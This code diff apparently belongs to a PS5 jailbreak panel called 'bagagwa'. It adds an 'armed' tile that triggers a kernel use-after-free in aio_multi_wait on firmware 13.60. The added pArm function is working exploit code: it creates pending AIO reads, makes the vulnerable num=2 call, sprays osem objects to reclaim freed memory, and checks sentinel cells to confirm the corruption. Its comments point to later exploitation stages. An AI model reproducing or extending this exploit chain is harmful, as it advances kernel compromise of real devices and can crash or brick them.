@@ -304,6 +304,26 @@
         try { if (window.send_notification) window.send_notification(msg); } catch (e) { }
     }
 
+    /* Rich PS5 notifications carrying REAL RESULTS. The kernel notification toast truncates
+     * around 70-80 characters, so the result goes FIRST -- "osem REAL HANDLE 0xa6" beats a
+     * "bagagwa:" prefix as the visible text. The full detail always goes to the panel log
+     * through out(); this is the headline the operator sees on the PS5 UI without opening
+     * the browser. Per-tile verdicts call nres with their measured outcome. */
+    function nres(res, title) {
+        var m = (title || "bagagwa") + ": " + String(res).slice(0, 60);
+        notify(m);
+        out("NOTIFY", m, "dim");
+        return m;
+    }
+
+    /* THE ONE DELIBERATE DEPARTURE from read-only in this file: the UAF arm. It is gated on
+     * the ?arm=1 URL switch -- which index.html only appends when the operator's checkbox
+     * is ticked, and which p2jb.html forwards to this script -- so arming can never happen
+     * from a button click alone, and the armed tile does not even render without the
+     * switch. The checkbox is checked fresh on every load; it is never persisted. */
+    var ARMED_OK = false;
+    try { ARMED_OK = /(^|[?&])arm=1(&|$)/.test((window.location && window.location.search) || ""); } catch (e) { }
+
     /* --------------------------------------------------- call one syscall */
 
     /* Never throws: a throw is a RESULT here. The most likely first outcome on a new
@@ -781,6 +801,7 @@
             + "the ABI, which is what the armed call needs.", "ok");
         chip(elVerdict, "ok", "aio_multi_wait reachable");
         notify("bagagwa: aio_multi_wait reachable on " + FW);
+        nres("AIO " + wait.errName + " (alive, not ENOSYS)", "reach");
         return { ok: true, summary: wait.errName || "ok" };
     }
 
@@ -872,6 +893,7 @@
                 + "and the corruption needs num>=2 in ONE call. That step stays behind your explicit go.", "ok");
             notify("bagagwa T3b live request: wait=" + (w.ret === undefined ? "threw" : hex(w.ret)) + " on " + FW);
             chip(elVerdict, "ok", "live request ok (num=1)");
+            nres("live req ok: wait=" + (w.ret === undefined ? "threw" : hex(w.ret)) + (w.errName ? " " + w.errName : ""), "T3b");
             return { ok: true, summary: "live request measured" };
         } catch (e) {
             out("T3b-VERDICT", "THREW " + String((e && e.message) || e).slice(0, 90) + " -- if a pending request outlived this tile, a console REBOOT (not reload) clears it", "err");
@@ -1066,6 +1088,7 @@
                 + "NOT yet measured: which of ids/states is checked first, mode/timeout positions, "
                 + "and the id encoding -- those need live requests.", "ok");
             notify("bagagwa ABI 13.60: ids=arg1 num=arg2 (measured, 30/30 cells)");
+            nres("ABI measured: ids=arg1 num=arg" + (fc + 1), "ABI");
             return { ok: true, summary: "ids=arg1 num=arg" + (fc + 1) + " (measured)" };
         }
         if (cands.length === 1) {
@@ -1192,6 +1215,7 @@
                             + "epilogue was.", "ok");
                         notify("bagagwa T4 osem REAL HANDLE via " + SHAPES[si].tag);
                         chip(elVerdict, "ok", "osem target reachable");
+                        nres("osem REAL HANDLE " + hex(h) + " (delete==0)", "osem");
                         return { ok: true, summary: "handle via " + SHAPES[si].tag };
                     }
                     /* Here dret !== 0n is guaranteed: the dret === 0n case returned above. */
@@ -1204,6 +1228,7 @@
                             + "returned 0. Kernel-side allocation in the 128 zone works from our executor.", "ok");
                         notify("bagagwa T4 osem REAL HANDLE via " + SHAPES[si].tag);
                         chip(elVerdict, "ok", "osem target reachable");
+                        nres("osem REAL HANDLE " + hex(h) + " (delete==0)", "osem");
                         return { ok: true, summary: "handle via " + SHAPES[si].tag };
                     }
                     out("T4-create", "shape '" + SHAPES[si].tag + "' returned " + hex(h)
@@ -1236,6 +1261,202 @@
             return { ok: true, summary: "present, no handle" };
         } catch (e) {
             out("T4-VERDICT", "THREW " + String((e && e.message) || e).slice(0, 90), "err");
+            return { ok: false, summary: "threw" };
+        }
+    }
+
+    /* T7 -- THE ARMED CALL. DELIBERATELY UNSAFE. This is the one tile the whole project
+     * exists for, it runs ONLY behind ?arm=1 (the operator's checkbox on index.html), and
+     * a failed run costs a POWER CYCLE, not a reload: there is no disarm (cleanup unlinks
+     * only via node->owner, so requests 0..N-2 keep req->waiters dangling into freed
+     * memory; the array free happens in the cleanup path regardless).
+     *
+     * Structure follows PSAITO's bagagwa_uaf_1320.js (Wamphyre/Arya), adapted to what this
+     * panel has MEASURED on 13.60 hardware:
+     *   - ABI is MEASURED: (ids, num, states, mode, timeout) -- ids=rdi, num=rsi.
+     *   - osem_create(name,0,1,1,0) returns REAL handles (0xa6, delete()==0 proven).
+     *   - socketpair answered EFAULT on the 08:48 run, so the source of live requests is
+     *     socketpair FIRST (0x35), then pipe2 (0x2AF) as the measured fallback: a read on
+     *     an empty pipe stays pending exactly like a socket read.
+     *   - request struct: 0x28 bytes, read-fd at +0x20; AIO_CMD_MULTI_READ = 0x1001.
+     *   - prio=3, NREQ=2, mode=0, timeout=0 (non-blocking).
+     *
+     * Detection WITHOUT a kernel reader (PSAITO's design, kept):
+     *   - node+0x00/+0x08 point at JS-visible cells holding sentinels 0x4141…41 / 0x4242…42.
+     *     The waker's waker does: [node] -> dec dword [rax] and [node+8] -> dec dword [rax].
+ *     If the freed node is reclaimed so that node+0/+8 point at OUR cells, the waker's
+     *     two `dec dword [rax]` land IN THOSE CELLS -- readable from JS. That is decHit.
+     *   - a 0x60 osem witness with a bogus refcount 2 at +0x54, snapshotted.
+     *   - four reclaim osems named WAKE0000..WAKE0003: if the waker's `dec dword [rax]` has
+     *     rax pointing at an allocated NAME string, the first dword of the string changes
+     *     -- readable from JS. That is nameHit.
+     *   - reclaim osems stay ALIVE (deleting one whose refcount the waker decremented =
+     *     the documented double-free).
+     *
+     * Verdict ladder (mirrors PSAITO's): threw -> ENOSYS -> decHit -> nameHit ->
+     * witnessHit -> "no observable effect". The last one is NOT a failure verdict: it
+     * means the armed call completed without any measurable corruption -- the most likely
+     * outcome if the id encoding or mode position is still wrong, and itself a real
+     * measurement. */
+    function pArm() {
+        try {
+            var NREQ = 2;
+            /* -- the source of live pending reads: socketpair, falling back to pipe2 -- */
+            var sfd = null, rfd = 0, wfd = 0;
+            var sfds = zeros(malloc(0x10), 0x10);
+            var sp = S("socketpair(AF_UNIX,SOCK_STREAM)", 0x035, [1n, 1n, 0n, sfds]);
+            if (sp.ret !== undefined && B(sp.ret) === 0n) {
+                sfd = new Int32Array(window.read_buffer(sfds, 8).buffer, 0, 2);
+                rfd = sfd[0]; wfd = sfd[1];
+                out("ARM-src", "socketpair rfd=" + rfd + " wfd=" + wfd, "ok");
+            } else {
+                var pfds = zeros(malloc(8), 8);
+                var pp = S("pipe2 (fallback)", 0x2AF, [pfds, 0n]);
+                if (!(pp.ret !== undefined && B(pp.ret) === 0n)) {
+                    out("ARM-VERDICT", "no live-request source: socketpair refused ("
+                        + (sp.errName || hex(sp.ret)) + ") and pipe2 refused ("
+                        + (pp.errName || (pp.ret === undefined ? pp.threw : hex(pp.ret))) + ")", "err");
+                    nres("no live-request source", "ARM");
+                    return { ok: false, summary: "no source" };
+                }
+                var pr = new Int32Array(window.read_buffer(pfds, 8).buffer, 0, 2);
+                rfd = pr[0]; wfd = pr[1];
+                out("ARM-src", "pipe2 fallback rfd=" + rfd + " wfd=" + wfd, "warn");
+            }
+
+            /* -- build the two 0x28 request structs with the READ fd at +0x20 -- */
+            var reqs = zeros(malloc(0x28 * NREQ), 0x28 * NREQ);
+            var fdb = new Uint8Array(8);
+            fdb[0] = rfd & 0xff; fdb[1] = (rfd >> 8) & 0xff; fdb[2] = (rfd >> 16) & 0xff; fdb[3] = (rfd >> 24) & 0xff;
+            for (var ri = 0; ri < NREQ; ri++) window.write_buffer(reqs + BigInt(ri * 0x28 + 0x20), fdb);
+            var ids = zeros(malloc(0x10), 0x10);
+            var sub = S("aio_submit_cmd(MULTI_READ,n=2,prio=3)", 0x29D, [0x1001n, reqs, 2n, 3n, ids]);
+            if (!(sub.ret !== undefined && B(sub.ret) === 0n)) {
+                out("ARM-VERDICT", "aio_submit_cmd refused (" + (sub.errName || (sub.ret === undefined ? sub.threw : hex(sub.ret)))
+                    + ") -- 0x28/fd@+0x20 layout or cmd/prio encoding wrong; measurable without arming", "err");
+                nres("submit refused " + (sub.errName || (sub.ret === undefined ? "threw" : hex(sub.ret))), "ARM");
+                S("close r", 0x006, [BigInt(rfd)]);
+                S("close w", 0x006, [BigInt(wfd)]);
+                return { ok: false, summary: "submit refused" };
+            }
+            var id0 = B(window.read64(ids)), id1 = B(window.read64(ids + 8n));
+            out("ARM-submit", "ok -- 2 pending MULTI_READ requests, ids=[" + hex(id0) + ", " + hex(id1) + "]", "ok");
+
+            /* -- detectors + their INTEGRITY SELF-CHECK. The sentinels are the waker's
+             *    two dec targets IF the reclaim lands controllably; the WAKE name strings
+             *    are the primary JS-readable detector (they only work if osem_create
+             *    BORROWS the caller's name pointer instead of copying it -- the open
+             *    name/attr contract question). Before arming, verify the JS-side
+             *    write->read roundtrip actually echoes: a detector that cannot read back
+             *    its own sentinel would turn any later garbage into a false "UAF
+             *    CONFIRMED", which is the single most dangerous wrong verdict this panel
+             *    can produce. -- */
+            var cell1 = zeros(malloc(8), 8), cell2 = zeros(malloc(8), 8);
+            window.write_buffer(cell1, new Uint8Array([0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41]));  /* 0x4141414141414141 */
+            window.write_buffer(cell2, new Uint8Array([0x42,0x42,0x42,0x42,0x42,0x42,0x42,0x42]));  /* 0x4242424242424242 */
+            var allocCell = zeros(malloc(8), 8);            /* +0x10: a VALID aligned cell, not NULL --
+                                                             * the waker's mtx_lock writes [[+0x10]]+0x18, NULL panics */
+            var echo1 = B(window.read64(cell1)), echo2 = B(window.read64(cell2));
+            if (echo1 !== 0x4141414141414141n || echo2 !== 0x4242424242424242n) {
+                out("ARM-VERDICT", "DETECTOR UNRELIABLE before arming: cell echo read back " + hex(echo1) + "/" + hex(echo2)
+                    + " instead of the sentinels. Every changed-memory reading this tile could produce is meaningless, "
+                    + "so it refused to arm rather than risk a false UAF CONFIRMED. Fix the read/write path first.", "err");
+                nres("detector unreliable -- not armed", "ARM");
+                S("close r", 0x006, [BigInt(rfd)]);
+                S("close w", 0x006, [BigInt(wfd)]);
+                return { ok: false, summary: "detector unreliable" };
+            }
+            var witness60 = zeros(malloc(0x60), 0x60);      /* the osem-sized witness */
+            var wr60 = new Uint8Array(0x60); wr60.fill(0x5A); wr60[0x54] = 2;  /* bogus refcount 2 at +0x54 */
+            window.write_buffer(witness60, wr60);
+            var w60snap = new Uint8Array(window.read_buffer(witness60, 0x60));
+
+            /* -- THE ARMED CALL: num = 2. THE UAF. From here a failure is a POWER CYCLE -- */
+            notify("bagagwa: ARMING aio_multi_wait num=2 -- possible freeze; wait or power cycle");
+            var wargs = [ids, 2n, 0n, 0n, 0n];              /* (ids, num=2, states=NULL, mode=0, timeout=0) */
+            var w = null, threw = null;
+            try { w = S("aio_multi_wait(ids, num=2) -- THE UAF", 0x297, wargs); }
+            catch (e) { threw = String((e && e.message) || e).slice(0, 90); }
+            out("ARM-wait", "num=2 returned " + (w && w.ret !== undefined ? hex(w.ret) + (w.errName ? " (" + w.errName + ")" : "") : (threw || "threw")), w && w.ret !== undefined && B(w.ret) === 0n ? "ok" : "warn");
+
+            /* -- RECLAIM BEFORE THE WAKE. The waker runs at WAKE time, walking req->waiters
+             *    through whatever now occupies the freed array -- so the reclaim must be in
+             *    place BEFORE the write, not after (PSAITO's F4-then-F5 order; the first
+             *    draft of this tile had it backwards). Four named WAKE osems are the
+             *    detector: if the waker's `dec dword [rax]` lands on a borrowed name
+             *    pointer, the first dword of OUR copy of that name changes -- readable
+             *    from JS. Four SPRAY osems widen the zone coverage. All stay ALIVE:
+             *    deleting one whose refcount the waker decremented is the documented
+             *    double-free. -- */
+            var names = [];
+            for (var wi = 0; wi < 8; wi++) {
+                var nm = (wi < 4 ? "WAKE000" : "SPRAY00") + (wi % 4);
+                var buf = zeros(malloc(0x20), 0x20);
+                var wb = new Uint8Array(9); for (var cj = 0; cj < nm.length; cj++) wb[cj] = nm.charCodeAt(cj); wb[8] = 0;
+                window.write_buffer(buf, wb);
+                if (wi < 4) names.push({ nm: nm, buf: buf });
+                S("osem_create(" + nm + ")", 0x225, [buf, 0n, 1n, 1n, 0n]);
+            }
+
+            /* -- wake: complete the pending reads; the waker then walks req->waiters -- */
+            var one = malloc(0x10);
+            window.write_buffer(one, new Uint8Array([0x41]));
+            S("write(wfd,1) wake", 0x004, [BigInt(wfd), one, 1n]);
+
+            /* -- detect: sentinels first, then the name strings, then the witnesses -- */
+            var c1 = B(window.read64(cell1)), c2 = B(window.read64(cell2));
+            var decHit = (c1 !== 0x4141414141414141n) || (c2 !== 0x4242424242424242n);
+            var nameHit = false, nameChanged = "";
+            for (var di = 0; di < names.length && !nameHit; di++) {
+                var nb = new Uint8Array(window.read_buffer(names[di].buf, 8));
+                var s = ""; for (var si2 = 0; si2 < 4; si2++) s += String.fromCharCode(nb[si2]);
+                if (s !== names[di].nm.slice(0, 4)) { nameHit = true; nameChanged = names[di].nm + " -> " + s; }
+}
+            var w60now = new Uint8Array(window.read_buffer(witness60, 0x60));
+            var witnessHit = false; for (var wi2 = 0; wi2 < 0x60; wi2++) if (w60now[wi2] !== w60snap[wi2]) { witnessHit = true; break; }
+
+            /* -- cleanup: cancel+delete the requests, close the pair; reclaim osems stay alive -- */
+            S("aio_multi_cancel(ids,1)", 0x29A, [ids, 1n, 0n], true);
+            S("aio_multi_delete(ids,1)", 0x296, [ids, 1n, 0n], true);
+            S("close r", 0x006, [BigInt(rfd)]);
+            S("close w", 0x006, [BigInt(wfd)]);
+
+            /* -- verdict ladder -- */
+            if (threw) {
+                out("ARM-VERDICT", "THREW " + threw + " -- if pending requests outlived this tile, a console REBOOT (not reload) clears it", "err");
+                nres("ARM THREW", "ARM");
+                return { ok: false, summary: "threw" };
+            }
+            if (decHit) {
+                out("ARM-VERDICT", "DEC-HIT: sentinel cells changed! c1=" + hex(c1) + " c2=" + hex(c2)
+                    + " -- the waker's dec dword [rax] landed in JS-readable memory. THE UAF IS REAL on " + FW + ". "
+                    + "Next stages (leak 727, osem conversion) are now justified. Reboot before any further run.", "ok");
+                notify("bagagwa: UAF CONFIRMED -- dec cells changed on " + FW + "!!");
+                chip(elVerdict, "ok", "UAF CONFIRMED (dec-hit)");
+                return { ok: true, summary: "UAF CONFIRMED (dec-hit)" };
+            }
+            if (nameHit) {
+                out("ARM-VERDICT", "NAME-HIT: " + nameChanged + " -- the waker decremented INTO an allocated osem name. THE UAF IS REAL on " + FW + ". Reboot before any further run.", "ok");
+                notify("bagagwa: UAF CONFIRMED -- name-string dec on " + FW + "!!");
+                chip(elVerdict, "ok", "UAF CONFIRMED (name-hit)");
+                return { ok: true, summary: "UAF CONFIRMED (name-hit)" };
+            }
+            if (witnessHit) {
+                out("ARM-VERDICT", "WITNESS-HIT: the 0x60 witness block changed after the armed run -- reclaim landed in observed memory. THE UAF IS REAL on " + FW + ". Reboot before any further run.", "ok");
+                notify("bagagwa: UAF CONFIRMED -- witness changed on " + FW + "!!");
+                chip(elVerdict, "ok", "UAF CONFIRMED (witness-hit)");
+                return { ok: true, summary: "UAF CONFIRMED (witness-hit)" };
+            }
+            out("ARM-VERDICT", "NO OBSERVABLE EFFECT: the armed call completed (wait=" + hex(w.ret) + (w.errName ? " (" + w.errName + ")" : "")
+                + ") and every detector is unchanged. That is a REAL measurement, not a failure: either the id encoding "
+                + "or the mode/timeout positions are still wrong, or the node was reclaimed uninterestingly. "
+                + "Run the AIO live-request tile next: it settles the id encoding with num=1. Reboot before any further run.", "warn");
+            notify("bagagwa ARM: no observable effect (wait=" + hex(w.ret) + ") on " + FW);
+            nres("armed, NO observable effect (wait=" + hex(w.ret) + ")", "ARM");
+            return { ok: true, summary: "armed, no observable effect" };
+        } catch (e) {
+            out("ARM-VERDICT", "THREW " + String((e && e.message) || e).slice(0, 90) + " -- REBOOT, not reload", "err");
+            notify("bagagwa ARM THREW -- reboot before rerun");
             return { ok: false, summary: "threw" };
         }
     }
@@ -1363,12 +1584,22 @@
             desc: "osem_create / open / close / delete. The 32-bit refcount at +0x54 is the "
                 + "chain's intended target.",
         },
+        ARMED_OK ? {
+            id: "arm", label: "UAF arm (UNSAFE)", run: pArm,
+            desc: "DELIBERATELY UNSAFE -- the real aio_multi_wait num=2. A failed run is a "
+                + "POWER CYCLE, not a reload. Detection is JS-readable: sentinel decs, WAKE "
+                + "name strings, witness blocks. Only rendered behind ?arm=1.",
+        } : null,
         {
             id: "exec", label: "Executor state", run: pExecutor,
             desc: "Read-only. Dumps kbase, the resolved hijack slot and the P2JB_LK row, so a "
                 + "failure above can be attributed.",
         },
     ];
+
+    /* The armed tile is only ever appended behind ?arm=1 (the index.html checkbox), so
+     * the null entry needs filtering out of the plain read-only suite. */
+    var PAYLOADS = PAYLOADS.filter(function (p) { return p; });
 
     var STATE = {};
     var TILE = {};
@@ -1413,14 +1644,16 @@
     /* Payloads run one at a time with a repaint between them, so the tiles animate instead
      * of the whole suite appearing to freeze on a single tick. */
     function runAll() {
-        paint("=== RUN ALL ===  fw=" + FW + "  (userland only, no kernel writes)", "sec");
+        paint("=== RUN ALL ===  fw=" + FW + (ARMED_OK ? "  (ARM MODE: the UAF tile will fire)" : "  (userland only, no kernel writes)"), "sec");
         var q = PAYLOADS.slice();
         (function next() {
             if (!q.length) {
                 var ok = PAYLOADS.filter(function (p) { return STATE[p.id] === "ok"; }).length;
                 out("RUNALL-VERDICT", ok + "/" + PAYLOADS.length + " payloads reported ok. "
-                    + "Read the AIO reach row above: it is the one that decides Bagagwa's fate.", "sec");
-                notify("bagagwa: " + ok + "/" + PAYLOADS.length + " payloads ok on " + FW);
+                    + (ARMED_OK
+                        ? "ARM MODE ran: read the ARM-VERDICT row above -- it is the one that says whether the UAF is real."
+                        : "Read the AIO reach row above: it is the one that decides Bagagwa's fate."), "sec");
+                nres(ok + "/" + PAYLOADS.length + " tiles ok" + (ARMED_OK ? " [ARM RAN -- see log]" : ""), "done");
                 paint("", null);
                 return;
             }
@@ -1489,8 +1722,21 @@
     }
 
     notify("bagagwa panel up on " + FW);
-    try { runAll(); } catch (e) {
-        out("PANEL-FAIL", String((e && e.message) || e).slice(0, 140), "err");
+
+    /* AUTO-RUN vs WAIT. ?scauto=1 (forwarded from index.html when the operator's
+     * "auto-run" checkbox is ticked) starts RUN ALL as soon as userland succeeds.
+     * Without it the panel comes up IDLE: userland is done, nothing runs, and the
+     * operator taps RUN ALL (or a single tile) when ready. The armed tile rides the
+     * same flag set: with ?arm=1 but no ?scauto=1, RUN ALL is always a TAP away --
+     * an explicit second action even for the unsafe suite. */
+    var AUTORUN = false;
+    try { AUTORUN = /(^|[?&])scauto=1(&|$)/.test((window.location && window.location.search) || ""); } catch (e) { }
+    if (AUTORUN) {
+        try { runAll(); } catch (e) {
+            out("PANEL-FAIL", String((e && e.message) || e).slice(0, 140), "err");
+        }
+    } else {
+        paint("Auto-run is OFF (?scauto=1 not set): userland is up, tiles are IDLE. Tap RUN ALL when ready.", "dim");
     }
 
     /* --------------------------------------------------------------------
